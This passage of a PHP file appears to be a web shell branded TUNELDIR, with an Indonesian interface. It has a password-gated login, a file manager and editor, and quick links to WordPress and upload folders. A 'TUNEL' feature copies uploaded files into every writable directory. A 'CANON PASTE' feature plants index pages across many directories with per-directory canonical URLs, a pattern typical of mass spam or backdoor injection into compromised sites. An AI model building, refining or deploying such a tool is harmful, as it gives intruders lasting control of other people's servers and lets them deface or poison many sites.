.login-footer a:hover{color:var(--red)}

/* ══════════════════════════════
   DASHBOARD
══════════════════════════════ */
.layout{display:flex;min-height:100vh;position:relative;z-index:1}

/* SIDEBAR */
.sidebar{
  width:235px;min-width:235px;
  background:linear-gradient(180deg,#080d12 0%,#060a0e 100%);
  border-right:1px solid var(--border);
  display:flex;flex-direction:column;
  position:sticky;top:0;height:100vh;overflow-y:auto;
}
.sb-logo{padding:20px 16px;border-bottom:1px solid var(--border);position:relative}
.sb-logo::after{content:'';position:absolute;bottom:0;left:10%;right:10%;height:1px;background:linear-gradient(90deg,transparent,var(--red3),transparent)}
.sb-brand{font-family:var(--horror);font-size:24px;color:var(--red);letter-spacing:2px;animation:flicker 5s infinite}
.sb-ver{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:1.5px;margin-top:2px}
.sb-online{display:inline-flex;align-items:center;gap:5px;font-size:10px;color:var(--green2);margin-top:3px}
.sb-online::before{content:'';width:5px;height:5px;background:var(--green);border-radius:50%;animation:blink 1.5s infinite}

.sb-sec{padding:10px 16px 3px;font-size:9px;font-weight:700;color:var(--red3);text-transform:uppercase;letter-spacing:2px;margin-top:6px;font-family:var(--mono)}
.sb-nav{list-style:none}
.sb-nav li a,.sb-nav li button{
  display:flex;align-items:center;gap:9px;width:100%;
  padding:9px 16px;border:none;background:transparent;
  color:var(--text2);font-size:12px;font-family:var(--font);
  text-decoration:none;cursor:pointer;transition:all .15s;text-align:left;
}
.sb-nav li a:hover,.sb-nav li button:hover{color:var(--red);background:rgba(139,0,0,0.1);border-right:2px solid var(--red)}
.sb-icon{font-size:13px;width:17px;text-align:center}

.sb-footer{margin-top:auto;padding:14px 16px;border-top:1px solid var(--border)}
.user-chip{
  display:flex;align-items:center;gap:8px;
  background:rgba(139,0,0,0.1);border:1px solid var(--red3);
  border-radius:var(--r2);padding:8px 10px;margin-bottom:8px;
}
.avatar{
  width:26px;height:26px;border-radius:50%;
  background:linear-gradient(135deg,var(--red3),var(--purple));
  display:flex;align-items:center;justify-content:center;
  font-size:11px;font-weight:700;color:#fff;flex-shrink:0;
  border:1px solid var(--red);
}
.uname{font-size:12px;font-weight:600;color:var(--text)}
.urole{font-size:10px;color:var(--red3);font-family:var(--mono)}
.info-r{display:flex;align-items:center;gap:6px;margin-bottom:4px;font-size:11px;color:var(--text3)}
.info-r strong{color:var(--green2);font-family:var(--mono)}

/* MAIN */
.main{flex:1;display:flex;flex-direction:column;min-width:0}

/* TOPBAR */
.topbar{
  background:linear-gradient(90deg,#080d12,#0a0f14);
  border-bottom:1px solid var(--border);
  padding:10px 20px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;
  position:relative;
}
.topbar::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--red3),transparent)}
.breadcrumb{display:flex;align-items:center;gap:3px;font-family:var(--mono);font-size:11px;flex:1;flex-wrap:wrap}
.breadcrumb a{color:var(--red);text-decoration:none}
.breadcrumb a:hover{color:var(--orange)}
.breadcrumb .sep{color:var(--text3)}
.breadcrumb .cur{color:var(--text2)}
.topbar-r{display:flex;gap:7px;align-items:center}

/* CONTENT */
.content{flex:1;padding:20px;overflow-y:auto}

/* STATS */
.stats-bar{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:10px;margin-bottom:18px}
.stat-card{
  background:linear-gradient(135deg,var(--surface),var(--surface2));
  border:1px solid var(--border);border-radius:var(--r);
  padding:14px 16px;position:relative;overflow:hidden;
}
.stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
.sc1::before{background:linear-gradient(90deg,var(--red3),var(--red))}
.sc2::before{background:linear-gradient(90deg,var(--purple),var(--cyan))}
.sc3::before{background:linear-gradient(90deg,var(--green2),var(--green))}
.sc4::before{background:linear-gradient(90deg,var(--gold),var(--orange))}
.s-label{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:1.5px;font-weight:600;font-family:var(--mono)}
.s-val{font-size:17px;font-weight:700;color:var(--text);font-family:var(--mono);margin-top:3px}
.s-sub{font-size:10px;color:var(--text3);margin-top:2px}
.s-ico{position:absolute;right:12px;top:50%;transform:translateY(-50%);font-size:24px;opacity:.1}
.disk-bar{height:4px;background:var(--border);border-radius:2px;overflow:hidden;margin-top:4px}
.disk-fill{height:100%;border-radius:2px;background:linear-gradient(90deg,var(--red3),var(--red))}

.canon-card{border-color:rgba(0,255,65,0.2);box-shadow:0 0 18px rgba(0,255,65,0.05),inset 0 0 30px rgba(0,255,65,0.02)}
.canon-card .card-hdr{background:linear-gradient(90deg,rgba(0,204,51,0.1),var(--surface2))}
.canon-card .card-hdr::after{background:linear-gradient(90deg,rgba(0,255,65,0.3),transparent)}

/* ALERTS */
.alert{border-radius:var(--r2);padding:10px 14px;margin-bottom:14px;font-size:13px;display:flex;align-items:center;gap:8px;font-family:var(--mono)}
.a-success{background:rgba(0,255,65,0.07);border:1px solid rgba(0,204,51,0.3);color:var(--green2)}
.a-error{background:rgba(139,0,0,0.15);border:1px solid rgba(255,26,26,0.3);color:#ff6666}

.tunel-result{border-radius:var(--r2);margin-bottom:14px;overflow:hidden;border:1px solid rgba(0,255,65,0.25);box-shadow:0 0 20px rgba(0,255,65,0.06)}
.tunel-result-hdr{background:rgba(0,204,51,0.12);border-bottom:1px solid rgba(0,255,65,0.2);padding:10px 16px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
.tunel-result-title{font-family:var(--mono);font-size:12px;font-weight:700;color:var(--green2)}
.tunel-result-count{font-family:var(--mono);font-size:10px;background:rgba(0,204,51,0.15);color:var(--green);border:1px solid rgba(0,255,65,0.3);border-radius:20px;padding:2px 9px}
.tunel-result-body{background:rgba(0,0,0,0.3);padding:12px 14px;max-height:380px;overflow-y:auto}
.tunel-url-item{display:flex;align-items:flex-start;gap:8px;padding:6px 0;border-bottom:1px solid rgba(0,255,65,0.06)}
.tunel-url-item:last-child{border-bottom:none}
.tunel-url-dot{color:var(--green);font-size:8px;flex-shrink:0;margin-top:4px}
.tunel-url-col{display:flex;flex-direction:column;gap:3px;min-width:0}
.tunel-url-link{font-family:var(--mono);font-size:12px;color:var(--green2);text-decoration:none;word-break:break-all;transition:color .15s}
.tunel-url-link:hover{color:var(--green);text-decoration:underline}
.canonical-badge{font-family:var(--mono);font-size:10px;color:rgba(0,204,51,0.6);padding-left:2px;word-break:break-all}
.tunel-copy-btn{background:rgba(0,204,51,0.15);border:1px solid rgba(0,255,65,0.3);color:var(--green2);font-family:var(--mono);font-size:10px;padding:3px 10px;border-radius:3px;cursor:pointer;transition:all .15s}
.tunel-copy-btn:hover{background:rgba(0,204,51,0.3)}

/* CARDS */
.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--r);overflow:hidden;margin-bottom:16px}
.card-hdr{
  padding:12px 16px;border-bottom:1px solid var(--border);
  display:flex;align-items:center;justify-content:space-between;
  background:linear-gradient(90deg,var(--surface2),var(--surface));
  position:relative;
}
.card-hdr::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,var(--red3),transparent)}
.card-title{font-size:12px;font-weight:700;color:var(--text);display:flex;align-items:center;gap:7px}
.card-body{padding:16px}

/* BUTTONS */
.btn{display:inline-flex;align-items:center;gap:5px;border:none;border-radius:var(--r2);padding:9px 16px;cursor:pointer;font-size:12px;font-weight:600;text-decoration:none;font-family:var(--font);white-space:nowrap;transition:all .2s}
.btn-block{width:100%;justify-content:center}
.btn-sm{padding:5px 10px;font-size:11px}
.btn-red{background:linear-gradient(135deg,var(--red3),var(--red2));color:#fff;border:1px solid var(--red3)}
.btn-red:hover{box-shadow:0 0 14px rgba(255,26,26,0.4);filter:brightness(1.2)}
.btn-ghost{background:transparent;color:var(--text2);border:1px solid var(--border2)}
.btn-ghost:hover{background:var(--surface2);color:var(--text);box-shadow:none}
.btn-danger{background:rgba(139,0,0,0.3);color:#ff6666;border:1px solid var(--red3)}
.btn-danger:hover{background:var(--red3);color:#fff;box-shadow:0 0 10px rgba(255,26,26,0.3)}
.btn-green{background:rgba(0,204,51,0.15);color:var(--green2);border:1px solid rgba(0,204,51,0.3)}
.btn-green:hover{background:rgba(0,204,51,0.25);box-shadow:0 0 10px rgba(0,255,65,0.2)}
.btn-warn{background:rgba(255,165,0,0.15);color:var(--gold);border:1px solid rgba(255,215,0,0.3)}
.btn-warn:hover{background:rgba(255,165,0,0.25)}
.btn-purple{background:rgba(123,0,255,0.2);color:#b57aff;border:1px solid rgba(123,0,255,0.4)}
.btn-purple:hover{background:rgba(123,0,255,0.35);box-shadow:0 0 10px rgba(123,0,255,0.3)}

/* ── TUNEL SECTION ── */
.tunel-card{
  border-color:var(--red3);
  box-shadow:0 0 20px rgba(139,0,0,0.15),inset 0 0 30px rgba(139,0,0,0.03);
}
.tunel-card .card-hdr{
  background:linear-gradient(90deg,rgba(139,0,0,0.2),var(--surface2));
}
.tunel-title{font-family:var(--horror);font-size:20px;color:var(--red);letter-spacing:2px}

.dir-select-wrap{
  max-height:260px;overflow-y:auto;
  background:var(--bg2);border:1px solid var(--border);
  border-radius:var(--r2);
  scrollbar-width:thin;scrollbar-color:var(--red3) transparent;
}
.dir-select-wrap::-webkit-scrollbar{width:4px}
.dir-select-wrap::-webkit-scrollbar-thumb{background:var(--red3);border-radius:2px}

.dir-item{
  display:flex;align-items:center;gap:9px;
  padding:7px 12px;border-bottom:1px solid rgba(26,37,53,0.5);
  cursor:pointer;transition:background .12s;
  font-family:var(--mono);font-size:11px;color:var(--text2);
}
.dir-item:last-child{border-bottom:none}
.dir-item:hover{background:rgba(139,0,0,0.08)}
.dir-item.selected{background:rgba(139,0,0,0.15);border-color:rgba(255,26,26,0.15)}
.dir-item input[type=checkbox]{
  accent-color:var(--red);width:14px;height:14px;flex-shrink:0;cursor:pointer;
}
.dir-item .dir-path{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.dir-item .dir-perm{font-size:10px;color:var(--text3);flex-shrink:0}
.dir-item .w-dot{width:5px;height:5px;border-radius:50%;flex-shrink:0}
.w-ok{background:var(--green)}
.w-no{background:var(--red)}

.tunel-controls{
  display:flex;gap:7px;flex-wrap:wrap;align-items:center;
  padding:8px 10px;background:var(--surface2);border-bottom:1px solid var(--border);
}
.tunel-counter{
  font-family:var(--mono);font-size:11px;color:var(--red);
  background:rgba(139,0,0,0.1);border:1px solid var(--red3);
  border-radius:3px;padding:2px 8px;margin-left:auto;
}

/* UPLOAD ZONE */
.upload-zone{
  border:2px dashed var(--border2);border-radius:var(--r);
  padding:26px;text-align:center;cursor:pointer;transition:all .2s;
  background:var(--surface2);position:relative;margin-top:12px;
}
.upload-zone:hover,.upload-zone.over{
  border-color:var(--red);
  background:rgba(139,0,0,0.05);
  box-shadow:inset 0 0 25px rgba(139,0,0,0.05);
}
.upload-zone input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%}
.up-icon{font-size:32px;margin-bottom:8px;display:block}
.up-text{color:var(--text2);font-size:13px}
.up-sub{color:var(--text3);font-size:11px;margin-top:2px;font-family:var(--mono)}
.fp-list{margin-top:10px;text-align:left}
.fp-item{display:flex;align-items:center;gap:6px;padding:5px 8px;border-radius:var(--r2);background:rgba(255,26,26,0.05);border:1px solid rgba(139,0,0,0.2);margin-bottom:3px;font-family:var(--mono);font-size:11px;color:var(--text2)}

/* FILE TABLE */
.ftw{overflow-x:auto}
.ftable{width:100%;border-collapse:collapse;font-size:12px}
.ftable th{text-align:left;padding:8px 12px;background:var(--surface2);color:var(--text3);font-size:9px;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;border-bottom:1px solid var(--border);white-space:nowrap;font-family:var(--mono)}
.ftable td{padding:8px 12px;border-bottom:1px solid rgba(26,37,53,0.7);vertical-align:middle}
.ftable tr:last-child td{border-bottom:none}
.ftable tr:hover td{background:rgba(139,0,0,0.04)}
.name-cell{display:flex;align-items:center;gap:6px;font-family:var(--mono)}
.ftable a{color:var(--text);text-decoration:none}
.ftable a:hover{color:var(--red)}
.dir-lnk{color:var(--cyan) !important}
.dir-lnk:hover{color:var(--red) !important}
.perm-b{font-family:var(--mono);font-size:10px;background:rgba(0,0,0,0.4);border:1px solid var(--border2);border-radius:3px;padding:1px 5px;color:var(--text3)}
.sym-b{font-family:var(--mono);font-size:9px;color:var(--text3);margin-left:2px}
.acts{display:flex;gap:3px;flex-wrap:wrap;align-items:center}

.badge{font-size:9px;font-weight:700;padding:2px 6px;border-radius:20px;font-family:var(--mono);display:inline-block}
.b-red{background:rgba(139,0,0,0.2);color:var(--red);border:1px solid var(--red3)}
.b-green{background:rgba(0,204,51,0.1);color:var(--green2);border:1px solid rgba(0,204,51,0.3)}
.b-cyan{background:rgba(0,229,255,0.08);color:var(--cyan);border:1px solid rgba(0,229,255,0.2)}

/* MODAL */
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(6px);display:flex;align-items:center;justify-content:center;z-index:1000;opacity:0;pointer-events:none;transition:opacity .2s}
.modal-overlay.show{opacity:1;pointer-events:all}
.modal{background:linear-gradient(145deg,var(--surface),var(--bg2));border:1px solid var(--red3);border-radius:var(--r);padding:24px;width:90%;max-width:440px;box-shadow:0 0 30px rgba(139,0,0,0.3),0 40px 80px rgba(0,0,0,0.7);transform:translateY(16px);transition:transform .2s}
.modal-overlay.show .modal{transform:translateY(0)}
.modal-title{font-size:13px;font-weight:700;color:var(--red);margin-bottom:16px;font-family:var(--mono)}
.modal-footer{display:flex;gap:7px;justify-content:flex-end;margin-top:16px}

/* EDITOR */
.editor-wrap textarea{width:100%;min-height:380px;resize:vertical;background:#030507;border:1px solid var(--border2);border-radius:var(--r2);color:var(--green);font-family:var(--mono);font-size:12px;line-height:1.7;padding:14px;outline:none;transition:border-color .2s}
.editor-wrap textarea:focus{border-color:var(--red);box-shadow:0 0 10px rgba(139,0,0,0.15)}

/* MISC */
.inline-form{display:flex;gap:7px;align-items:center;flex-wrap:wrap}
.contact-band{background:var(--surface);border:1px solid var(--border);border-radius:var(--r);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;margin-top:4px}
.contact-info{display:flex;align-items:center;gap:8px;color:var(--text2);font-size:12px}
.contact-info a{color:var(--red3);text-decoration:none}
.contact-info a:hover{color:var(--red)}

::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:var(--red3)}

@media(max-width:768px){.sidebar{display:none}.content{padding:12px}.stats-bar{grid-template-columns:1fr 1fr}}
</style>
</head>
<body>

<?php if (!td_auth()): ?>
<!-- ═══════════════════ LOGIN ═══════════════════ -->
<div class="login-wrap">
  <div class="login-card">
    <div class="corner corner-tl"></div>
    <div class="corner corner-tr"></div>
    <div class="corner corner-bl"></div>
    <div class="corner corner-br"></div>

    <div class="login-logo">
      <span class="skull-icon">&#x1F480;</span>
      <h1>TUNELDIR</h1>
      <div class="sub">FILE MANAGER SYSTEM</div>
    </div>

    <?php if ($loginErr): ?>
    <div class="err-box">&#x26A0; <?php echo htmlspecialchars($loginErr); ?></div>
    <?php endif; ?>

    <form method="POST" action="<?php echo htmlspecialchars($baseUrl); ?>">
      <div class="form-group">
        <label class="form-label">&#x1F510; Access ID</label>
        <input class="form-input" type="text" name="u" placeholder="masukkan identitas..." required autocomplete="username">
      </div>
      <div class="form-group">
        <label class="form-label">&#x1F5DD; Access Key</label>
        <input class="form-input" type="password" name="p" placeholder="&#x2022;&#x2022;&#x2022;&#x2022;&#x2022;&#x2022;&#x2022;&#x2022;" required autocomplete="current-password">
      </div>
      <button class="btn-login" type="submit" name="do_login" value="1">
        &#x1F480; &nbsp; MASUK KE SISTEM
      </button>
    </form>

    <div class="login-footer">
      <span style="color:var(--red3)">&#x2605;</span>
      contact: <a href="mailto:<?php echo $TD_EMAIL; ?>"><?php echo $TD_EMAIL; ?></a>
      <span style="color:var(--red3)">&#x2605;</span>
    </div>
  </div>
</div>

<?php else: ?>
<!-- ═══════════════════ DASHBOARD ═══════════════════ -->
<div class="layout">

  <!-- SIDEBAR -->
  <aside class="sidebar">
    <div class="sb-logo">
      <div class="sb-brand">&#x1F480; TUNELDIR</div>
      <div class="sb-ver"><?php echo $TD_VER; ?> &bull; PHP <?php echo $phpVer; ?></div>
      <div class="sb-online">SISTEM AKTIF</div>
    </div>

    <div class="sb-sec">&#x25B6; Navigasi</div>
    <ul class="sb-nav">
      <li><a href="<?php echo $baseUrl; ?>?dir=<?php echo urlencode($relDir); ?>"><span class="sb-icon">&#x1F4C2;</span> File Manager</a></li>
      <li><a href="#sec-tunel"><span class="sb-icon">&#x1F30A;</span> TUNEL (Multi-Dir)</a></li>
      <li><a href="#sec-canon"><span class="sb-icon">&#x1F4DD;</span> Canon Paste</a></li>
      <li><a href="#sec-upload"><span class="sb-icon">&#x2B06;</span> Upload Biasa</a></li>
      <li><a href="#sec-tools"><span class="sb-icon">&#x1F6E0;</span> Tools</a></li>
      <li><a href="#sec-sysinfo"><span class="sb-icon">&#x2699;</span> System Info</a></li>
    </ul>

    <?php
    $quickDirs=array();
    $knownDirs=array('wp-content','wp-admin','wp-includes','uploads','images','assets','public','static','files','tmp','backup','cache');
    foreach ($knownDirs as $qd) {
        if (is_dir($root.DIRECTORY_SEPARATOR.$qd)) $quickDirs[]=$qd;
    }
    if (!empty($quickDirs)):
    ?>
    <div class="sb-sec">&#x25B6; Quick Dirs</div>
    <ul class="sb-nav">
      <li><a href="<?php echo $baseUrl; ?>?dir=/"><span class="sb-icon">&#x1F3E0;</span> Root</a></li>
      <?php foreach ($quickDirs as $qd): ?>
      <li><a href="<?php echo $baseUrl; ?>?dir=<?php echo urlencode('/'.$qd); ?>"><span class="sb-icon">&#x1F4C1;</span> <?php echo $qd; ?></a></li>
      <?php endforeach; ?>
    </ul>
    <?php endif; ?>

    <div class="sb-footer">
      <div class="user-chip">
        <div class="avatar"><?php echo strtoupper(substr($_SESSION['td_usr']??'A',0,1)); ?></div>
        <div>
          <div class="uname"><?php echo htmlspecialchars($_SESSION['td_usr']??'Admin'); ?></div>
          <div class="urole">// ADMINISTRATOR</div>
        </div>
      </div>
      <div class="info-r">&#x1F418; PHP <strong><?php echo $phpVer; ?></strong></div>
      <div class="info-r">&#x1F464; <strong><?php echo htmlspecialchars($sysUser); ?></strong></div>
      <a href="<?php echo $baseUrl; ?>?logout=1" class="btn btn-danger btn-sm" style="width:100%;justify-content:center;margin-top:8px">&#x1F6AA; Logout</a>
    </div>
  </aside>

  <!-- MAIN -->
  <main class="main">

    <!-- TOPBAR -->
    <div class="topbar">
      <div class="breadcrumb">
        &#x1F480;&nbsp;
        <?php foreach ($crumbs as $i=>$c): ?>
          <?php if ($i<count($crumbs)-1): ?>
            <a href="<?php echo $baseUrl; ?>?dir=<?php echo urlencode($c['path']); ?>"><?php echo htmlspecialchars($c['label']); ?></a>
            <span class="sep">/</span>
          <?php else: ?>
            <span class="cur"><?php echo htmlspecialchars($c['label']); ?></span>
          <?php endif; ?>
        <?php endforeach; ?>
      </div>
      <div class="topbar-r">
        <span class="badge b-red"><?php echo count($entries); ?> items</span>
        <?php
        if ($relDir!=='/') {
            $pp=explode('/',rtrim($relDir,'/'));array_pop($pp);
            $pd=implode('/',$pp);if($pd==='')$pd='/';
            echo '<a href="'.$baseUrl.'?dir='.urlencode($pd).'" class="btn btn-ghost btn-sm">&#x2B06; Up</a>';
        }
        ?>
        <a href="<?php echo $baseUrl; ?>?logout=1" class="btn btn-danger btn-sm">&#x1F6AA;</a>
      </div>
    </div>

    <!-- CONTENT -->
    <div class="content">

      <?php if (!empty($msg['text'])): ?>
        <?php if ($msg['type']==='tunel' && !empty($msg['urls'])): ?>
        <div class="tunel-result">
          <div class="tunel-result-hdr">
            <div class="tunel-result-title">&#x1F30A; <?php echo $msg['text']; ?></div>
            <div style="display:flex;align-items:center;gap:8px">
              <span class="tunel-result-count">&#x2714; <?php echo $msg['count']; ?> URL</span>
              <button class="tunel-copy-btn" onclick="tunelCopyAll()">&#x1F4CB; Copy Semua URL</button>
            </div>
          </div>
          <div class="tunel-result-body" id="tunelUrlBody">
            <?php echo $msg['urls']; ?>
          </div>
        </div>
        <textarea id="tunelUrlRaw" style="position:absolute;left:-9999px;top:-9999px" readonly><?php
          echo isset($msg['rawurls']) ? htmlspecialchars($msg['rawurls']) : '';
        ?></textarea>
        <?php else: ?>
        <div class="alert a-<?php echo htmlspecialchars($msg['type']); ?>"><?php echo $msg['text']; ?></div>
        <?php endif; ?>
      <?php endif; ?>

      <!-- STATS -->
      <div class="stats-bar">
        <div class="stat-card sc1">
          <div class="s-label">Current Dir</div>
          <div class="s-val" style="font-size:10px;word-break:break-all;margin-top:4px"><?php echo htmlspecialchars($relDir); ?></div>
          <div class="s-ico">&#x1F4C2;</div>
        </div>
        <div class="stat-card sc2">
          <div class="s-label">Total Items</div>
          <div class="s-val"><?php echo count($entries); ?></div>
          <?php $fd=0;$ff=0;foreach($entries as $e){if($e['is_dir'])$fd++;else $ff++;} ?>
          <div class="s-sub"><?php echo $fd; ?> dir &bull; <?php echo $ff; ?> file</div>
          <div class="s-ico">&#x1F4CA;</div>
        </div>
        <div class="stat-card sc3">
          <div class="s-label">Disk Free</div>
          <div class="s-val"><?php echo $freeSpace!==false?td_sz((int)$freeSpace):'N/A'; ?></div>
          <?php if ($diskPct>0): ?><div class="disk-bar"><div class="disk-fill" style="width:<?php echo $diskPct; ?>%"></div></div><?php endif; ?>
          <div class="s-ico">&#x1F4BE;</div>
        </div>
        <div class="stat-card sc4">
          <div class="s-label">TUNEL Dirs</div>
          <div class="s-val"><?php echo count($allDirs); ?></div>
          <div class="s-sub"><?php echo $writableDirs; ?> writable</div>
          <div class="s-ico">&#x1F30A;</div>
        </div>
      </div>

      <!-- EDIT MODE -->
      <?php if ($editMode): ?>
      <div class="card">
        <div class="card-hdr">
          <div class="card-title">&#x270F; Edit: <?php echo htmlspecialchars(basename($editFile)); ?></div>
          <a href="<?php echo $baseUrl; ?>?dir=<?php echo urlencode($relDir); ?>" class="btn btn-ghost btn-sm">&#x2715; Tutup</a>
        </div>
        <div class="card-body">
          <form method="POST" action="<?php echo htmlspecialchars($baseUrl); ?>?dir=<?php echo urlencode($relDir); ?>">
            <input type="hidden" name="action" value="edit_save">
            <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars(basename($editFile)); ?>">
            <div class="editor-wrap">
              <textarea name="file_content" spellcheck="false"><?php echo htmlspecialchars($editContent); ?></textarea>
            </div>
            <div style="margin-top:10px;display:flex;gap:7px">
              <button class="btn btn-green" type="submit">&#x1F4BE; Simpan</button>
              <a href="<?php echo $baseUrl; ?>?dir=<?php echo urlencode($relDir); ?>" class="btn btn-ghost">Batal</a>
            </div>
          </form>
        </div>
      </div>
      <?php endif; ?>

      <!-- ══ TUNEL ══ -->
      <div class="card tunel-card" id="sec-tunel">
        <div class="card-hdr">
          <div class="card-title">
            <span class="tunel-title">&#x1F30A; TUNEL</span>
            <span class="badge b-red">Multi-Dir Upload</span>
          </div>
          <span style="font-family:var(--mono);font-size:10px;color:var(--red3)"><?php echo count($allDirs); ?> dirs ditemukan</span>
        </div>
        <div class="card-body">
          <form method="POST" enctype="multipart/form-data" action="<?php echo htmlspecialchars($baseUrl); ?>?dir=<?php echo urlencode($relDir); ?>" id="tunelForm">
            <input type="hidden" name="action" value="tunel">

            <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:12px">

              <!-- DIR SELECTOR -->
              <div>
                <div style="font-size:10px;color:var(--text3);font-family:var(--mono);margin-bottom:7px;text-transform:uppercase;letter-spacing:1px">
                  &#x1F4C1; Pilih Direktori Tujuan:
                </div>
                <div class="tunel-controls">
                  <button type="button" class="btn btn-sm btn-red" onclick="tunelSelectAll(true)">&#x2714; Pilih Semua</button>
                  <button type="button" class="btn btn-sm btn-ghost" onclick="tunelSelectAll(false)">&#x2715; Batal Semua</button>
                  <button type="button" class="btn btn-sm btn-green" onclick="tunelSelectWritable()">&#x1F7E2; Writable Saja</button>
                  <span class="tunel-counter" id="tunelCount">0 dipilih</span>
                </div>
                <div class="dir-select-wrap" id="dirSelectWrap">
                  <?php foreach ($allDirs as $ad):
                    $adRel = td_rel($ad);
                    $adW   = is_writable($ad);
                  ?>
                  <label class="dir-item <?php echo $adW?'':''; ?>">
                    <input type="checkbox" name="tunel_dirs[]" value="<?php echo htmlspecialchars($adRel); ?>"
                      data-writable="<?php echo $adW?'1':'0'; ?>"
                      onchange="tunelCount()">
                    <div class="w-dot <?php echo $adW?'w-ok':'w-no'; ?>"></div>
                    <span class="dir-path" title="<?php echo htmlspecialchars($adRel); ?>"><?php echo htmlspecialchars($adRel); ?></span>
                    <span class="dir-perm"><?php echo td_perm($ad); ?></span>
                  </label>
                  <?php endforeach; ?>
                  <?php if (empty($allDirs)): ?>
                  <div style="padding:20px;text-align:center;color:var(--text3);font-family:var(--mono);font-size:11px">Tidak ada sub-direktori ditemukan.</div>
                  <?php endif; ?>
                </div>
              </div>

              <!-- FILE UPLOAD -->
              <div>
                <div style="font-size:10px;color:var(--text3);font-family:var(--mono);margin-bottom:7px;text-transform:uppercase;letter-spacing:1px">
                  &#x1F4E4; File Yang Akan Disebarkan:
                </div>
                <div class="upload-zone" id="tunelZone">
                  <input type="file" name="tunel_files[]" id="tunelInput" multiple>
                  <span class="up-icon">&#x1F30A;</span>
                  <div class="up-text">Drag &amp; Drop atau klik pilih file</div>
                  <div class="up-sub">Multi-file &bull; akan disebar ke semua dir terpilih</div>
                  <div class="fp-list" id="tunelPreview"></div>
                </div>
              </div>
            </div>

            <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
              <button class="btn btn-red" type="submit" style="font-size:13px;padding:10px 22px">
                &#x1F30A; SEBARKAN FILE (TUNEL)
              </button>
              <span style="font-size:11px;color:var(--text3);font-family:var(--mono)">File akan di-copy ke semua direktori yang dipilih</span>
            </div>
          </form>
        </div>
      </div>

      <!-- CANON PASTE -->
      <div class="card canon-card" id="sec-canon">
        <div class="card-hdr">
          <div class="card-title">
            <span style="font-family:var(--horror);font-size:18px;color:var(--green2);letter-spacing:1px">&#x1F4DD; CANON PASTE</span>
            <span class="badge b-green">Auto Canonical</span>
          </div>
          <span style="font-family:var(--mono);font-size:10px;color:var(--green2)">paste kode &rarr; sebarkan ke banyak dir</span>
        </div>
        <div class="card-body">
          <div style="background:rgba(0,255,65,0.04);border:1px solid rgba(0,255,65,0.12);border-radius:var(--r2);padding:10px 14px;margin-bottom:14px;font-family:var(--mono);font-size:11px;color:rgba(0,204,51,0.7);line-height:1.8">
            &#x2139; Paste kode HTML/PHP kamu di bawah. Jika file adalah <code style="color:var(--green2)">index.html</code> / <code style="color:var(--green2)">index.php</code> dan mengandung <code style="color:var(--green2)">&lt;link rel="canonical" href="#"&gt;</code>, tools akan otomatis mengganti <code style="color:var(--green2)">href="#"</code> dengan URL direktori tujuan masing-masing sebelum disimpan.
          </div>
          <form method="POST" action="<?php echo htmlspecialchars($baseUrl); ?>?dir=<?php echo urlencode($relDir); ?>">
            <input type="hidden" name="action" value="canon_paste">
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">

              <!-- KODE -->
              <div style="display:flex;flex-direction:column;gap:10px">
                <div>
                  <label class="form-label">&#x1F4C4; Nama File</label>
                  <input class="form-input" type="text" name="canon_fname" placeholder="index.html atau index.php" required style="font-family:var(--mono)">
                  <div style="font-size:10px;color:var(--text3);margin-top:4px;font-family:var(--mono)">Hanya file index.* yang akan diproses canonical-nya</div>
                </div>
                <div style="flex:1">
                  <label class="form-label">&#x1F4CB; Kode HTML / PHP</label>
                  <textarea name="canon_code" id="canonCode" required
                    style="width:100%;min-height:320px;resize:vertical;background:#020405;border:1px solid rgba(0,255,65,0.2);border-radius:var(--r2);color:var(--green);font-family:var(--mono);font-size:12px;line-height:1.7;padding:14px;outline:none;transition:border-color .2s;display:block"
                    onfocus="this.style.borderColor='rgba(0,255,65,0.5)'"
                    onblur="this.style.borderColor='rgba(0,255,65,0.2)'"
                    placeholder="Paste kode index.html atau index.php kamu di sini...&#10;&#10;Contoh canonical yang akan diganti otomatis:&#10;&lt;link rel=&quot;canonical&quot; href=&quot;#&quot;&gt;"></textarea>
                  <div style="display:flex;gap:7px;margin-top:7px;flex-wrap:wrap;align-items:center">
                    <button type="button" class="btn btn-ghost btn-sm" onclick="canonPreview()">&#x1F50D; Preview Canonical</button>
                    <button type="button" class="btn btn-ghost btn-sm" onclick="document.getElementById('canonCode').value=''">&#x1F5D1; Kosongkan</button>
                    <span id="canonDetect" style="font-family:var(--mono);font-size:10px;color:var(--text3)"></span>
                  </div>
                </div>
              </div>

              <!-- DIR SELECTOR -->
              <div>
                <label class="form-label">&#x1F4C1; Direktori Tujuan</label>
                <div class="tunel-controls" style="border-color:rgba(0,255,65,0.15)">
                  <button type="button" class="btn btn-sm btn-green" onclick="canonSelectAll(true)">&#x2714; Pilih Semua</button>
                  <button type="button" class="btn btn-sm btn-ghost" onclick="canonSelectAll(false)">&#x2715; Batal</button>
                  <button type="button" class="btn btn-sm btn-green" onclick="canonSelectWritable()">&#x1F7E2; Writable</button>
                  <span class="tunel-counter" id="canonDirCount" style="border-color:rgba(0,255,65,0.3);color:var(--green)">0 dipilih</span>
                </div>
                <div class="dir-select-wrap" style="border-color:rgba(0,255,65,0.1);max-height:340px" id="canonDirWrap">
                  <?php foreach ($allDirs as $ad):
                    $adRel = td_rel($ad);
                    $adW   = is_writable($ad);
                  ?>
                  <label class="dir-item">
